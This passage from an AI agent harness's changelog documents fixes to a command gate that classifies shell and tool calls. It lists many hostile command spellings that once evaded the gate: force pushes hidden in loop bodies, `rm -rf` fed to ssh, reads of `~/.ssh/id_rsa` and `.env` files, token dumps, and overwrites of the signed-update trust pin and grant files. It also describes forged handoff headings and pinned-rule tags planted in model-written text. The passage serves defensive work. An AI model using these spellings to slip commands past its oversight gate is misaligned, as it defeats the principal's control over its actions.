  substitution in the `cd` itself or before it keeps its own folder, by its place in the line and not by its text,
  and so does an `ssh` remote command. One in a here-doc body counts as after every command on its line, and one in
  a compound's own redirections runs before the compound. A push, post or delete inside such a substitution keeps
  the deny it had when it decided the line: an anchored allow rule such as `^git push` no longer lifts a command
  read from a nested line, and a deny on the matrix cell of an irreversible command held anywhere on a secret line
  holds, while the line keeps the weight of its own parts.
- Gate (#464, #448, D-075 amendment): a part's own matrix cell now counts in the #191 pass, as its category
  line and rules do. A matrix deny on any command of a compound line denies the line, so a store write or a
  secret on the line no longer hides it. Under `matrix: {irreversible: {private: deny}}`,
  `rm -rf ~/work; touch ~/.exo/state/x`, `rm -rf ~/.exo/policies` and `git push --force origin main && rm -rf build`
  are denied, where they asked. After `cd /dev` or `cd /proc/self/fd`, a store write keeps the descriptor folder
  as a target, so `target:/dev*` or `target:/proc*` still denies it. A relative key read after `tar -C` into a
  store (`tar -C ~/.exo/policies -czf - ../keys/seat`) is a `credentials` part, so `deny: [credentials]` denies
  it. A file tool on a store or secret path keeps its own reading as a part (a `local_write` part for each file
  a write tool writes), so `deny: [delete]` denies `delete_file ~/.exo/state/x` and `deny: [read]` denies
  `read_file ~/.ssh/id_rsa`, as for the shell forms. Each call keeps its category, card and approvers, and no
  decision is lower than before. When the decision fails on a store write or secret (a policy pattern that does
  not compile), the exo-gate hook's fallback card asks the principal alone, once, in observe mode too.
- Gate (#436, D-038 amendment): `for NAME do LIST; done` and `select NAME do LIST; done`, with no `in` list and no
  `;` before `do`, are read as `for NAME; do LIST; done`. Bash and POSIX accept that form and run the loop over the
  positional parameters, but the gate read the body as words of the `for` command and classified nothing in it, so
  `for x do git push --force origin main; done` was allowed under every policy, `deny: [force_push]` included. A
  force push, delete, post or store write in such a body now gets its own category, and a `deny:` entry for it
  denies the line, also inside `$( )`, `bash -c`, `eval`, a function body (`function f { for x do ...`) or another
  compound.
- Gate store protection (#133, D-038 amendment): the signed-update trust pin is a store path. With
  `update.require_signed` on, `exo update` installs the upstream tip only when it verifies against
  `$EXO_HOME/update/allowed_signers` (D-073), and a tool could rewrite that file with no ask: `cp /tmp/evil
  ~/.exo/update/allowed_signers` was an allowed `shell` and a `write_file` there an allowed `local_write`, so the
  principal's next approved `exo update` could install code signed by the tool's own key. A write to
  `$EXO_HOME/update` or anything in it (a redirection, `cp`, `mv`, `tee`, `sed -i`, `ln`, `rm -rf` of the folder, a
  file tool, a relative name after `cd`) is now `store_write`: it always asks, only the principal answers, and no
  grant covers it. `.exo/update` and `update/allowed_signers` count by name anywhere. `exo update --pin-trust` is
  `store_write` too and keeps its `opaque_exec` reading as a part, so a deny on `opaque_exec` still denies it.
  Reads stay `read`, and a project folder called `update` is unchanged. A file tool's write to the pin is
  `store_write`, and since #448 it keeps its `local_write` reading as a part, so a `local_write` deny still
  denies it. `config.json` is left to #125 (D-074).
- Gate (#316, follow-up to #240, D-038): ssh's stdin reached its login shell in five more ways the gate did not
  see, so the line read as plain `ssh` and was allowed, even under category denies. A compound fed from a file or
  an unread pipe (`{ ssh host; } < cmds.sh`, `while read h; do ssh host; done < hosts.txt`), an output process
  substitution (`echo 'rm -rf /data' > >(ssh host)`, `tee >(ssh host)`), a `$( )` that inherits such a stdin
  (`cat cmds.sh | echo $(ssh host)`), a remote hop (`ssh a ssh b`, `ssh a 'cd /; ssh b'`, `ssh a ssh b ssh c`) and
  a wrapper's stdin (`uv run ssh host < cmds.sh`, `{ uv run ssh host; } < cmds.sh`) now ask as `opaque_exec`. A
  known text fed through a hop is read, so `echo 'rm -rf /data' | ssh prod-db ssh inner` is denied under `deny:
  [delete]`. `ssh -n` (also before a word that may expand, as in `while read h; do ssh -n "$h" uptime; done <
  hosts.txt`), a command's own `< /dev/null` (also on a wrapper around it), an inner ssh with a command or a stdin
  of its own, and a compound fed only `/dev/null` keep their reading. A `>( )` is still read for a `cd` in it
  (`echo >(cd ~/.config); cat gh/hosts.yml` stays `credentials`) and in a declare value. The part that runs the
  stdin sits beside ssh's own part, which keeps its reading, so sudo around ssh still makes that part costly and
  reserved entries keep their hits. `sudo ssh host < cmds.sh` is now denied under a rule that denies `costly`
  `shell` parts. Some lines decide lower. Under a policy that allows or logs
  `opaque_exec`, a line where the new part displaces a logged part, such as sudo or a `git push` beside the ssh,
  goes from `log` to `allow` (`{ sudo ssh host; } < cmds.sh`, as `sudo ssh host < cmds.sh` did). Under a rule
  that denies `costly` `shell` parts, a nested line sudo runs whose `>( )` or `$( )` now reads an ssh as fed asks
  (`sudo ssh jump 'tee >(ssh host)'`, as `sudo ssh jump 'ssh host < f'` does). And `ssh -n "$h" uptime <
  hosts.txt` is allowed, where it asked, since ssh never reads its stdin then, also under `deny: [opaque_exec]`, as
  `ssh -n host uptime < hosts.txt` is. Otherwise `deny` entries and category denies still see every part.
  With #399's other targets, the part that runs the stdin names the host for an empty one too, so `echo 'gh pr
  comment -wR myorg/app -b hi' | ssh buildhost` is still denied under a `github_post` deny on `buildhost`. A `$( )`
  in a value declare reads again is read as fed too (`cat f | declare -a 'a=($(ssh host))'`). A post a hop reads
  can displace a later post as the deciding part, so the line is decided on that post's targets, as with `ssh host`
  in place of the hop. Under a scope that makes the hosts private, the later post's footer is then listed once, not
  twice, and the line still asks.
- Gate (#394, D-075 amendment): a rule keyed on `command` no longer lowers a compound line whose commands it does not
  name, and the change never makes a decision looser than before. The regex saw the whole line, so
  `{command: '^git status', decision: allow}` allowed `git status; git push --force origin main`, also under
  `categories: {force_push: deny}`, and `{command: 'rm -rf build', decision: allow}` lifted
  `categories: {github_post: deny}` from the post in `gh pr comment 3 --body hi && rm -rf build`. Each simple command on
  a line now carries its own text, as written with its redirections, nested ones too (`$( )`, `bash -c`, `eval`, a
  heredoc a shell reads, `ssh`). A rule that would lower a compound line (an allow or log rule below the line's matrix
  cell and category line, an ask rule under a category deny, an allow or log rule that names `opaque_exec`) must still
  match the line as before. Its regex must also cover every command that decides the line, every other command on the
  line that would be stricter alone, and every command that changes shell state for later commands (an assignment,
  `export`, `hash`, `alias`, `set -a`, `source`, `read`, a function definition and the like). Otherwise the rule is
  passed over and the walk goes on, but the rule step keeps the stricter of the first match and the rule found after it,
  and a rule passed over does not name `opaque_exec` for the floor. In the #191 pass an allow, log or ask rule lifts a
  part's category deny only when it also names that part. When a rule is passed over, the line is also decided as
  before, and that decision stands, reason and all, unless the new one is stricter. So under
  `{command: 'git push --force origin main', decision: allow}` the push is still allowed after `cd repo`, but asks
  beside `rm -rf build` or after `export GIT_SSH_COMMAND=$X`, and `gh pr comment 3 --body hi && rm -rf build` is denied
  under `categories: {github_post: deny}` and `{command: 'rm -rf build', decision: ask}`. An anchored rule such as
  `'^git push --force origin main$'` still matches no compound line, as before. `cd` is not a setter, and that cannot
  loosen a decision, since the rule must still match the line. A part with no own text (an unread nest, a string literal
  in code, the opaque_exec reading of a `$".."` line) passes no such test. A line of one simple command beside parts
  the gate made for it with no own text (`cat ~/.kube/config`, where the secret path decides the line, or a string
  literal in `node -e` code) is decided as before. A shell or interpreter that runs a pipe has
  the pipeline as its text. Those texts hold at most four times the line's length plus 4 KB on one line, and a reader
  past that has none, so a long pipeline into shells stays linear in memory. A command run inside another (an
  `eval`, `bash -c` or `ssh` string, an `-x` or `--exec` value) must be named too, so `eval "$CMD"` now asks under
  `{category: opaque_exec, command: '^eval', decision: allow}`. A rule written for a whole compound line, such as
  `'^git push origin main && git push origin dev$'`, has to name each command too, for example as
  `['^git push origin main && git push origin dev$', '^git push origin (main|dev)$']`. Until it does, that line logs, as
  its matrix cell says. Rules that keep or raise the line, deny rules in the #191 pass and
  the `reserved:` and `deny:` lists match the whole line and its decoded views as before. The ledger view leaves the own
  text out.
- Gate (#334, follow-up to #231, D-038): a deep `$( )` nest in a value #231 reads no longer stalls the gate hook or
  drops a deny. A single-quoted `PROMPT_COMMAND`, `PS4`, `BROWSER`, `PSQL_PAGER`, `SUDO_ASKPASS`, `GIT_PROXY_COMMAND`,
  `GIT_PAGER`, `git -c core.sshCommand` or `GIT_CONFIG_*` value with n levels of `$(` cost about n**4 (15 s at 40
  levels, over a minute at 200). From about 500 levels the lexer's recursion raised RecursionError, so the hook asked
  for the whole line and a `git push --force` after the value was no longer denied under `deny: [force_push]`. One
  classify call now reads each line once per depth, and a line read again spends the brace and store budgets again,
  so no result changes. A lexer reads 16 levels of `$( )`, `<( )` and `$(( ))` inside one another. Past them it finds
  where the nest ends in one pass, as the lexer would end it, and the nest stands as an unread `opaque_exec` part that
  asks, also in an exported value. So the deny after it fires at any depth, and 5,000 levels take under a second.
  Nests of 16 levels or fewer classify as before. `decide` scopes and walks each part of a result once, also a part
  that several results share, so it stays linear in the line too. The levels around the unread part still pair a
  here-document with the line that ends it when its delimiter, quoted or not, or its body holds that part, so a
  command after the here-document is still read. Also #335: a `git -c` or `--config-env` key that loads a file,
  allows a transport or names a program no longer hides git's subcommand.
  `git -c include.path=/dev/null push --force origin main` is a `force_push` again (it asks, and `deny: [force_push]`
  denies it), where #231 made it an `opaque_exec` that only asked. `git config include.path FILE` keeps its
  `local_write` part, and an unknown subcommand still names the config that may define it.
- A known key split where a background job's log rotates at `output_cap` no longer leaves its end in the job's
  completion notice, or its two parts in `job_output` (follow-up to #321). While the notice redacts the log, the end of
  `<id>.log.1` now stands in for the rotation note at its start. Keys that overlap each other or themselves can chain
  from further back, so that end grows, up to the whole file, until the text before it can change no match in the live
  log. So the notice never keeps a character that redacting both files as one text would cut out. `job_output` joined
  both files with the note between the two parts of the key, so redaction missed it. It now drops the note when it reads
  `<id>.log.1`, so the key is whole and is redacted, unless `job_output`'s own cut to the last 20,000 characters splits
  it (and, with keys that overlap each other, a key next to it). A key split inside a character outside ASCII can still
  leave a part. So can a key split at either end of output that rotated between `job_output`'s reads of the two files,
  since that output is missing with no note where it was. The `job.updated` events carried the job's command unredacted
  to clients and the events table. They now cut known key values out of it before they cut it to 300 characters, as the
  notice does (docs/JOBS.md "The completion notice").
- A forged `## Next steps` heading in a handoff can no longer beat the genuine one (#353, D-040). #349 kept the
  first section of each name, which is right for the principal's sections but wrong for Next steps, the one section
  written last: a multiline tool path or an old file's unquoted summary could put a forged copy first, and its
  steps reached the resume counts and the retrieval query. List fields (files, processes, open decisions, next
  steps, the topic line) now lose their newlines when written, and `load_handoff` reads Next steps from its last
  copy in the file. Principal sections still read the first. For files written before #349 this fixes the parsed
  fields only: `resume_text` still carries the raw file, forged headings included.
- A compaction summary in a handoff's `## State` can no longer forge a principal section (#315, D-040). The summary
  was written unquoted, so a `## Decisions made (principal's words, verbatim)` line in model text made a second
  section of that name, and `load_handoff` kept the later one: the forged ruling in, the principal's real ruling
  dropped, and the agent's last report read as a ruling. The summary is now quoted like the brief and the last
  report, and the reader keeps the first section of each name, so the parsed fields of an old file with a
  duplicate heading read the writer's real section. `resume_text` still carries the raw file text.
- `scripts/deploy-site.sh` pins the Vercel CLI (64.1.0, was `vercel@latest`) and refuses any deploy, versioned or
  not, when `site/` has untracked files. An unversioned staging deploy used to copy the whole folder, so an untracked
  private `site/pitch/` would have shipped. `.DS_Store` is skipped. `EXO_VERCEL_CLI` must be an exact `X.Y.Z`.
- Gate store protection (#210, #269, #217, D-038). Three writes or reads of the gate's own inputs were allowed and now
  ask. (1) The bus folder is a store path: a write to `$EXO_HOME/bus/registry.json` (the seat keys signed approval
  answers trust), `relay.sqlite` and its `-wal`/`-shm`/`-journal` files, or the folder itself is `store_write` (the
  principal alone, no grant), as is a write to where `EXO_BUS_REGISTRY`, `EXO_BUS_DB` or `EXO_BUS_KEYS_DIR` (or the
  legacy `DIVAN_` names) point; `cp forged.json ~/.exo/bus/registry.json` was an allowed `shell`. (2) A relative name
  read from a folder in `$EXO_HOME` is checked as the path it names, `..` included, so `cd ~/.exo/run/jobs && cat
  ../exod*`, `grep -r . ..` there, `cd .. && ls` from there and `tar -C ~/.exo -czf - run` are `credentials` as the
  absolute paths are; `cat 1.log` in `run/jobs` stays a read. The run folder's file names are store file names for
  the `cd` check, and its `seats/` scan runs once per classify call instead of once per glob word. (3) A write through
  a descriptor or process-folder path (`/dev/fd/3`, `/dev/stdin`, `/proc/self/fd/3`, `/proc/self/cwd`,
  `/proc/<pid>/root`, also after `cd /dev` or `cd /proc/self`) is `store_write`, and so is a store file opened for
  reading on a numbered descriptor (`exec 3< ~/.exo/state/gate-grants.json`, `{ ...; } 1< f`, and on stdout or
  stderr any target from a variable, a glob or a relative name), because on Linux a later `> /dev/fd/3` or
  `> /dev/stdout` writes it back; `exec 3< grants; printf X > /dev/fd/3` rewrote the grants file with no ask. Writes
  to the writer's own stdout and stderr (`/dev/fd/1`, `/dev/stdout`) keep their class. A descriptor path used as an
  input of a writing command asks too (`jq . /dev/stdin > out.json`, `patch -i /dev/stdin`, `gh ... --body-file
  /dev/stdin`), as a principal-only store write whose card says the path is one the gate cannot resolve.
- Gate policy (#191, #211, #208). A `categories: {X: deny}` line or a rule with `decision: deny` now denies a line
  when any part of it is X, as a `deny:` entry has since D-075: `echo $(git push origin main) > /tmp/f` was `log`
  under `categories: {local_write: deny}`, and a wrapped or fed-shell line asked under `categories: {opaque_exec:
  deny}`, as do #303's coproc and ssh-fed lines under an `opaque_exec`, `shell` or host deny. Only a deny reaches the parts, and the reason names the part (D-075 amendment). A changed
  `approvals.yaml` now narrows who may answer at once and shortens new grants (`gate.strictest_approvers`, the
  shorter `always` value), where a seat the principal had just removed could still approve and `days: 0` still
  wrote a 7-day grant; a wider file still waits for `/gate accept` (D-038 amendment). A post whose body the gate
  cannot read asks: stdin (`--body-file -` with a pipe or `<`), `gh api` `@file` fields and `--input`, `--fill`,
  templates, gist files, curl/wget/httpie file and stdin bodies, `$( )`, backticks or a variable in the text, a
  repeated or clustered text option, and a body file the hook did not read. The hook reads a body file only by an
  absolute path (it read a relative one from exod's own folder, so `cd docs && gh ... --body-file notes.md` passed),
  and a missing, oversized or unread file asks. Such a post gets no "always", no standing grant matches it, and a
  required executor refuses it as a recorded deny instead of an internal error. An unrelated heredoc no longer
  fills in a body file's text, and `curl -d@f` and `gh api -fbody=x` are posts (D-033 amendment). Piped stdin
  counts only from one simple command whose output bash does not rewrite: `(cat f; echo F) | gh ... --body-file -`,
  `printf 'Zo\x72k' |`, `echo -e` and an unquoted heredoc with a backslash ask. gh text options follow gh's own
  list of options that take a value (`gh issue create -t -b -b x`), `--attach` asks, and `curl --data-ascii @f`,
  `curl -K cfg URL` and `curl -d x "$URL"` are posts where they were a read or a local write. A word bash expands
  without `$` (`Zo{r,}k`, a glob, a leading `~`), a heredoc or here-string on another descriptor (`3<<EOF`), a
  heredoc whose delimiter line only nearly matches (`EOF `), `--title --body --body x`, and a body file under
  `/dev` or `/proc` ask too.
- Gate (#207, #240, D-038): two shell forms ran a program the gate did not read. A redirection, heredoc or
  here-string between `coproc`, its name and a compound opener (`coproc rm >/dev/null { -rf x`, `coproc 2>/dev/null
  rm { ...`) makes bash run the name as a simple command; the gate skipped it as a name, so such a line asked under
  `deny: [delete]`. It now reads the name as the program too, and the line is denied. With no remote command, `ssh
  host` runs its stdin in the login shell on the host; text piped or fed by heredoc or here-string (`echo 'rm -rf
  /data' | ssh prod-db`, `ssh prod-db <<EOF`) was a plain `ssh` and allowed even under category denies. It is now read
  as shell, as for `bash -s`: the line asks, a denied command in it is denied, and its parts stay `internal`. `-n`,
  `-N`, `-f` and a remote command keep the old reading; options after the host (`ssh host -T`) are read as ssh reads
  them.
- Gate (#209, #202, #225, #199, D-038): four spellings of a secret-store path were allowed reads and now ask. A
  harmlessly named link into a store (`notes.txt` to `~/.ssh/id_rsa`, `cfg` to `~/.ssh`, `app.cfg` to a project
  `.env`) is judged by where it leads, resolved from the session's working folder (the core now passes it to tool
  hooks as `cwd`), from the gate's own and, for a shell tool, from the call's own `cwd` argument; a `cwd` argument on
  a file tool, which the tool ignores, changes nothing. Each hook callback now gets only the keyword arguments it
  declares (all of them with `**kwargs`), so a callback without `cwd` keeps working. A `.pub` name exempts
  only a path that resolves to one. `${EXO_HOME:-$HOME/.exo}/keys` and the other `${VAR<op>word}` forms of `HOME`,
  `EXO_HOME`, `CLAUDE_CONFIG_DIR` and `EXO_PRINCIPAL_STORE` are read with the value and with the default. An
  expansion inside a store name (`cat .e$(:)nv`, ``cat .e``nv``, `cat ~/.n${x}etrc`, `cat ${x}.env`) is read as
  empty, and as any text between two literal parts (`cat .e$(echo n)v`). A glob in bash's bracket syntax
  (`~/.kube/[^x]onfig`, `[[:alpha:]]onfig`) is read as bash reads it, and `/proc/<pid>/<glob>` is matched against
  `environ`. One classify call now shares its file-system lookups across the line's words, so a 10 KB line
  classifies several times faster. Limits in GATE.md "Other spellings of a store path".
- A pinned block in text the principal did not write no longer reads as one to the model (#279, D-040 amendment).
  The core's system message quotes each span too small to summarize word for word, so a peer's, bus seat's, job
  notice's or tool result's copy of exo-context's `<exo-pinned>` block sat there looking like the principal's pinned
  rulings (#216 had already kept it out of handoffs). Wherever the harness prints a message for the model (verbatim
  spans, the summarizer's source, the note on other threads' turns, recalled memory), text by any author but the
  principal has the tags escaped as `&lt;exo-pinned&gt;`. So does every summary as it is made (the core's summary
  nodes, and exo-context's `[CONTEXT COMPACTION]` message before it adds its own block), since a summarizer can
  decode the escaped tag or write one, and so does the handoff `/exo resume` puts into the system message. The match
  takes any case, any spaces, punctuation or invisible characters in or around the name, and a tag with no `>`.
  Nothing is removed. The principal's own words keep their tags, and exo-context's own block is unchanged. The note
  on other threads now labels a bus seat's turn `bus:` instead of `user:`.
- Search tools skip secret stores (#241, D-038). The gate checks only the path a `grep` or `glob` call names, and the
  tools walked everything below it, so `grep {pattern: "key", path: HOME}` (or the same search with no path from a cwd
  of HOME, or of `$EXO_HOME`) returned `~/.aws/credentials`, `$EXO_HOME/keys/*` and `$EXO_HOME/run/exod.principal.key`
  as an allowed read. Both tools now leave out every folder and file below the root that `is_sensitive_path` matches,
  as found or through a link (`notes.txt` pointing into `~/.ssh`), do not enter a store folder, and end with `[skipped
  N secret-store paths; read one by name to be asked]`. A store named as `path` still asks and, once approved, is
  read; `~/.ssh/..` is not a store for that and walks HOME with its stores left out, and a store-named link to an
  ordinary folder (`backup.key` to HOME) returns nothing. A root whose real path is `/` (`/`, `/proc/self/root`, a
  link to `/`) is refused, and stores are matched under the root's real path without a doubled `/`, so a custom
  `$EXO_HOME` stays out there too. In a repo's own `.claude` folder (beside a `.git`) the `worktrees`, `commands`,
  `agents` and `skills` folders are searched, so a `.claude/worktrees` checkout is not hidden; `~/.claude`, the rest
  of a repo's `.claude` and any `.claude` that holds a Claude login, transcripts or shell snapshots (another home that
  is a git checkout) stay out. `code_find` refuses a folder that is or holds a known store (the home folder,
  `$EXO_HOME`, `~/.config`, `/`), since `jg` walks it itself. About 0.2 to 0.4 s more CPU on a 20,000-file tree.
- Gate (#230, #232, D-038): follow-ups to the exec-option and environment-dump coverage of #164. These were allowed
  and now ask: an `ssh`/`scp -o` setting whose keyword the gate cannot read (`ssh -o "$OPT" h`, `-o $OPT`, a glob, an
  unclosed quote that the expansion may close: `-o '"'"$OPT"`) is `opaque_exec`; `git ls-remote --exec=cmd`, git's
  hidden synonym of `--upload-pack`, is followed; an environment dump behind a `NAME+=value` or `NAME[i]=value`
  assignment (`FOO+=1 printenv GITHUB_TOKEN`, `sudo FOO+=1 printenv X`, `env FOO[0]=1`) is `credentials`; tar takes
  any abbreviation of `--checkpoint-action` longer than `--checkpoint` (`--checkpoint-a=exec=cmd`, `--checkpoint-ac
  'exec=cmd'`), and those are followed as the full name was (`mosh --ssh=cmd` in any case or after `+` is read by
  D-075's mosh reading, #126). Two
  asks #164 added are allowed again, exactly as before it: ssh's `none` value (`-o ProxyCommand=none`,
  `RemoteCommand`, `LocalCommand`, `KnownHostsCommand`, `PKCS11Provider` or `SecurityKeyProvider` set to `none`, any
  case), which ssh_config documents as turning the setting off; and a `psql` line starting with `system` (psql has no
  `system` command; `mysql` keeps it, and both keep `\!`). A card no longer says "runs runs", `ssh {,} host -o ...`
  has a test, and GATE.md names the compressors the gate knows and `ssh -F` as a known limit.
- Provider status rows and `exo models` redact URL userinfo (#271). Basic-auth logins no longer appear in
  these displays or client status payloads. Connection endpoints remain unchanged. Invalid URLs produce a
  generic label; secrets in URL paths, queries or fragments remain outside this redaction's scope.
- Tool subprocesses (bash, background jobs, `code_find`) drop inherited shell startup hooks (#135, D-039
  amendment): bash itself acts on `BASH_ENV`, exported functions (`BASH_FUNC_<name>%%`), `SHELLOPTS` and
  `BASHOPTS` at startup; `ENV` is read by interactive POSIX shells a command starts; `PS4` matters once xtrace is
  on. They match by exact name and are not secret names: `ENV` itself is dropped (keep it with
  `env_allow = ["ENV"]`), while `DEPLOY_ENV`, lowercase `env`, a `?env=` URL query and claude-cli diagnostics are
  unaffected. Exact `env_allow` entries restore them; `env_deny` wins. The bash tool and background jobs start
  bash with `--norc`, so `SSH_CLIENT` or `SSH2_CLIENT` with `SHLVL` unset or 0 no longer makes every call source
  `~/.bashrc` and skip an allowed `BASH_ENV`. Loader and interpreter hooks (`LD_PRELOAD`, `PYTHONPATH`,
  `NODE_OPTIONS`, ...) are documented as not scrubbed.
- A `deny` or `reserved` entry in `gates.yaml` now matches any simple command on a compound line, nested ones included
  (D-075). Before, only the most severe part was checked, so `git push origin main && rm -rf build` asked about the
  delete and ran the denied push on approval. Each part carries the tool of its call (`tool:execute_code` no longer
  denies `python -c` run from bash) and the decoded views of its line (`g''it push origin main && rm -rf build` denies
  under a `command: 'git push'` entry), the `ssh` hop and the `internal` exposure of an `ssh` line reach every part, and
  a standing grant in exo-gate no longer covers a reserved part of the line. A denied command in a `python -c` or
  `execute_code` string literal denies whatever its place in the literal (`./build.sh; systemctl enable x` was dropped
  as opaque), and `\n` escapes split the literal. A mapping entry's keys that are not match keys (`reason`, a note, a
  typo) widen it instead of making it match nothing. A `target:` entry matches the `ssh` host whatever the form
  (`user@host`, `ssh://host:22`), and `ssh` options are read as getopt reads them: the value of `-B`, `-P`, `-I` or of a
  cluster ending in a value letter (`ssh -vp 22 host rm -rf /data`) was read as the host, so the line was `allow` even
  under `deny: [delete]`; such a line now asks or denies. `mosh` options are read as mosh's Getopt::Long reads them
  (one dash or two, any case, a unique prefix, options after the host, mosh's own short options), so `mosh
  --serv='rm -rf /data' host` and `mosh host --server=...` are read, and a word that names no single option asks. The
  command given to `mosh --ssh`, `--client` or `--server` is read and asks; with `mosh --local` it runs here and is
  not `internal`. An option's value that reads as `--server=...` (`mosh --port '--server=...' host`) is still read
  as a command and asks, and so are words after the host that mosh takes as its options or values (with
  `POSIXLY_CORRECT` set mosh runs them as the command). A `--` right after the `ssh` or `mosh` host ends the options,
  and the command after it is read.
  `Decision.reserved` lists each hit once, and its ledger view redacts URL userinfo. Where the gate cannot read a
  command (for example nesting past the depth cap, `eval $(...)`, a command on stdin, `watch`/`tmux`-style
  wrappers) the line asks as opaque
  rather than denying, and so does an `ssh` chain past the hop cap (#153). `${...}` bodies are still `allow` even
  under `deny` (#143); `docs/GATE.md` lists the open paths.
- The gate reads the command behind wrappers that run one (#160, D-038): `setsid`, `flock`, `chroot`, `unshare`,
  `nsenter`, `taskset`, `chrt`, `numactl`, `chronic`, `unbuffer`, `catchsegv`, `firejail`, `dbus-run-session`,
  `xvfb-run`, `systemd-run` and `watch`, after their options and fixed operands, and the command strings of
  `flock -c`, `script -c`, `watch`, `tmux new-session`/`new-window`/`split-window`/`respawn-pane`/`respawn-window`/
  `run-shell`, `tmux -c`, `screen -dm` and `parallel CMD ::: args`. `setsid git push origin main` was `opaque_exec`,
  so a deny on `vcs_push` only asked; it is now `vcs_push` and denied. With D-075 a `deny` entry for the inner
  command denies the line even when it does not outrank `opaque_exec` (`setsid systemctl enable foo` under
  `deny: [schedule]`). A tmux command list is split at an argument ending in `;` (`'sleep 3;'`), not only at a `;` word, so
  `tmux new-session -d 'sleep 3;' new-window 'git push origin main'` is `vcs_push` too, and tmux's default
  aliases `splitp` and `split-pane` are read as `split-window`. An environment dump behind a wrapper
  (`setsid printenv GITHUB_TOKEN`, `taskset 1 env`, `xvfb-run -a env`) is `credentials` like the bare command
  (#155), so `deny: [credentials]` denies it; it was `opaque_exec` and asked. The wrapper keeps the
  `indirection` floor, so a line that asked still asks; `chroot`, `nsenter`, `unshare` and `systemd-run` add a
  signal like `sudo`. A command the gate cannot read (`setsid $CMD`, `tmux send-keys`, `parallel` reading its
  input) stays `opaque_exec`. A category line or a rule that denies `opaque_exec` itself now asks for such a line
  instead of denying it (a `deny:` entry still denies it, D-075); naming `opaque_exec` at `ask` or `deny` no longer
  turns off the indirection floor (#178), so none of these lines logs.
- Gate (#192, D-038): on a line that enters a folder that can hold a secret store, a relative read of a store file is
  `credentials` and asks. `cd ~/.config/gh && cat hosts.yml`, `cd ~/.kube && cat config`,
  `cd ~/.docker && cat config.json`, `cd ~/.kube && tar czf - .` and `cd ~/.config/g{h..h} && cat hosts.yml` were
  allowed reads. A line enters a store folder when a `cd`, `pushd`, `git -C`, `env -C`, `sudo -D` or `tar -C` target
  anywhere in it (after `||` or `time`, in `$( )` or `<( )`, spelt `c\d` or `"cd"`, or attached as in `env -C~/.kube`)
  has a store folder among its parts, or goes by a relative name into one below another target
  (`cd ~/.config && cd ./gcloud`, `cd / && cd proc`, `cd ~/.config/nvim && cd ../gcloud`): a dot folder from the
  sample stores (`.kube`, `.config`), or a plain one below its parent (`.config/gh`, `/proc`), so a checkout called
  `exo` or `gh` is not one. Then a relative name counts when its file name is a store file name (`config`,
  `hosts.yml`, `environ`, or a glob that could match one, read with bash's bracket and leading-dot rules) or it goes
  into a store folder (`gh/hosts.yml`, `../keys/x`), and `.` counts in a store folder. A name that goes into a plain
  store folder from its parent counts on any line when it names a store (`cd /srv && tar cf - exo-home/keys` with
  `EXO_HOME=/srv/exo-home`). The target's own word is not a read, and quoted code (`awk '{print $1, $2}'`,
  `tr '[:upper:]'`) is not a store name. The folder is not followed from command to command, so this fails closed:
  `cd ~/.kube && cd ~/project && cat config` and `cd ~/.config/nvim && npm config get prefix` ask too. Lines that
  enter no store folder and name none are unchanged, and the check is linear in the line. A `store_write` line stays
  `store_write`.
- Absolute symlink aliases into protected Exo stores retain the principal-only write approval floor (#130),
  including missing leaves, deletion of store ancestors, and `cd`, `pushd` or `git -C` into an alias of the store.
  A path the gate cannot resolve (a NUL byte) keeps its lexical check instead of raising. `cp -s`, `cp -l` (also
  `--sym`, `--li`) and a relative `ln` target that alias the store ask too. The `ln` target is read against
  `-t DIR`, the last operand and its parent, with options anywhere on the line (`ln REL LINK -s`). `docs/GATE.md`
  lists what stays open (hardlinks, protected entries that link out of the store, case-insensitive filesystems,
  glob and brace spellings, `/dev/fd/N` magic links, #217).
- State files are written through a temporary file from `mkstemp`, never through a fixed temporary name (#273). The
  key registry, the `exo update` pin, the composer history, `exo taste export-house`, handoffs, the agent's file
  tools (`write_file`, `edit_file`, `patch`), the gate's grants and the bus cursor and session map each wrote
  `<file>.tmp` (or a name like it) with a plain open and renamed it. A process that could create a file in the
  folder could plant a symlink at that name and turn the next write into a write to any file the user can write.
  One helper, `exo.core.private.atomic_write`, now does these writes. It removes the temporary file when a write
  fails, and each file keeps its mode. The `.pub` file `exo keygen` writes and the episodic view cache were written
  straight to their final names. They are replaced the same way now. The principal token, `config.json`, provider
  state, peer presence and the ledger anchors were not open to this and use the same helper now. The helper fsyncs
  the file and its folder, so these writes take a millisecond or two more on a disk. The ledger anchors, the bus
  cursor and the view cache are written often and skip the fsync, as before, so an append costs what it did.
- Inspect commands inside `coproc` without losing quotes (or, in the simple form, the heredoc), while
  retaining the indirection floor (#131). A name before a compound command (`coproc w { ...; }`,
  `coproc w while ...`, `coproc w if ...`) is skipped as bash does, so the inner command is classified;
  `function NAME { ...; }` is read the same way. An environment dump inside either (`coproc env`) is
  `credentials`. Before D-075, a coproc was denied only when its inner command outranked `opaque_exec`;
  with it, a `deny` entry matching any inner command denies the coproc.
  A `credentials` line keeps the highest reversibility of its parts, so `coproc env; rm -rf x` stays
  irreversible and a policy that denies irreversible actions still denies it.
- The gate reads the array subscript in the variable names of `printf -v`, `read`, `declare`, `typeset`, `local`,
  `unset`, `test -v`/`[ -v` and `wait -p` (#179, D-038). Bash runs a `$( )` or backticks there even inside single
  quotes, so `printf -v 'a[$(gh pr comment ...)]' %s x` was allowed; it is now a `github_post`. Bash also evaluates
  the command's output or a variable's value there, so any expansion or quoting in such a subscript asks
  (`unset "arr[$i]"` and `printf -v 'a[$(date)]' %s x` were allowed and now ask). A nested subscript
  (`a[b[0]+$(cmd)]`) is read to its end. A `\$` or `` \` `` at the subscript's top level is literal, as bash
  reads it; bash before 5.2 expands a nested subscript again, so there the gate reads the command. Past the
  nesting limit such a command is `opaque_exec`.
- The gate reads the values `declare`, `typeset`, `local`, `readonly` and `export` evaluate again (#188, D-038).
  With `-a` or `-A` a compound value `(..)` is parsed again as words even when quoted (the gate reads it with or
  without them), a `-i` value is arithmetic and a `-n` value is a name whose subscript runs when used, so
  `declare -a 'b=($(gh pr comment ...))'`, `export -a 'b=(<(gh ...))'`, `declare -i x='a[$(gh ...)]'` and
  `declare -n r='a[$(gh ...)]'` were allowed and are now a `github_post`. A command there, and an expansion bash
  evaluates again, also asks (`declare -a 'b=($(date))'`, `local -i n=$1`, `local -n ref=$1`,
  `declare -a 'a=([$i]=1)'` and `declare -a "b=($x)"` were allowed and now ask). When such a command outranks the
  line's own category, a category line or rule that denies the line's category asks, never allow or log, also when
  the policy names `opaque_exec` (`declare -a 'b=($(sudo ls))' > /tmp/f` under `categories: {local_write: deny}`,
  until #191); a `deny:` list entry still denies it (D-075). A command nested deeper
